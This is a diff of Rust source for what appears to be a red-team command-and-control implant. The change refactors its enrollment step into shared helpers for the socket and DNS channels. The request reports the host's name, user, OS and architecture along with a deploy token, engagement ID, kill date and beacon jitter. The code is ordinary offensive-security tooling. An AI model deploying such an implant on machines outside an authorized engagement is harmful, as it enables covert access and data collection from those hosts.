@@ -11,8 +11,9 @@ use crate::trust::{self, Certificate};
 
 // The enroll client: the JSON body contract the web route carries
 // (camelCase keys, base64 certificate material), with the bake's envelope
-// shaping applied as the wire contract defines it. The implant
-// owns its private key throughout; only the public half crosses the wire.
+// shaping applied as the wire contract defines it. The keypair exists to
+// enroll: nothing after enroll signs with it (no transport re-proves
+// possession), so only the public half is kept.
 
 #[derive(Serialize)]
 #[serde(rename_all = "camelCase")]
@@ -29,7 +30,6 @@ struct EnrollBody<'a> {
     kill_date: Option<&'a str>,
 }
 
-#[derive(Default)]
 pub struct Enrollment {
     pub implant_id: String,
     pub engagement_id: String,
@@ -193,19 +193,7 @@ fn enroll_over_socket(url: &str, profile: &Profile, keys: &KeyPair) -> Result<En
         .map_err(|e| format!("enroll transport: dial {authority}: {e}"))?;
     stream.set_nodelay(true).ok();
 
-    let request = crate::wire::EnrollRequest {
-        deploy_token_secret: profile.token.clone(),
-        class: String::new(),
-        public_key: keys.public_spki_der(),
-        parent_implant_id: String::new(),
-        hostname: hostname(),
-        os: std::env::consts::OS.to_string(),
-        arch: std::env::consts::ARCH.to_string(),
-        username: username(),
-        kill_date: profile.kill_date.clone().unwrap_or_default(),
-        sleep_seconds: Some(profile.sleep_seconds),
-        jitter_seconds: Some(profile.jitter_seconds),
-    };
+    let request = wire_enroll_request(profile, keys);
     let frames = crate::wire::encode(&[crate::wire::Frame {
         payload: request.encode_to_vec(),
         kind: crate::wire::FrameKind::EnrollRequest as i32,
@@ -242,10 +230,37 @@ fn enroll_over_socket(url: &str, profile: &Profile, keys: &KeyPair) -> Result<En
         .find(|frame| frame.kind() == crate::wire::FrameKind::EnrollResponse)
         .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
         .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
+    enrollment_from_response(answer)
+}
+
+/// The enroll request every frame-speaking carriage sends: the web route's
+/// JSON fields promoted into the proto, host facts and cadence included.
+/// One constructor so the socket and DNS exchanges report a machine
+/// identically.
+pub(crate) fn wire_enroll_request(profile: &Profile, keys: &KeyPair) -> crate::wire::EnrollRequest {
+    crate::wire::EnrollRequest {
+        deploy_token_secret: profile.token.clone(),
+        class: String::new(),
+        public_key: keys.public_spki_der(),
+        parent_implant_id: String::new(),
+        hostname: hostname(),
+        os: std::env::consts::OS.to_string(),
+        arch: std::env::consts::ARCH.to_string(),
+        username: username(),
+        kill_date: profile.kill_date.clone().unwrap_or_default(),
+        sleep_seconds: Some(profile.sleep_seconds),
+        jitter_seconds: Some(profile.jitter_seconds),
+    }
+}
+
+/// The accepted-answer mapping every frame-speaking carriage runs: refusal
+/// by status, the CA chain parsed as the enrollment's substance.
+pub(crate) fn enrollment_from_response(
+    answer: crate::wire::EnrollResponse,
+) -> Result<Enrollment, String> {
     if answer.status != crate::wire::rod::EnrollStatus::Ok as i32 {
         return Err(format!("enroll rejected: status {}", answer.status));
     }
-
     let ca_chain = answer
         .ca_chain
         .iter()
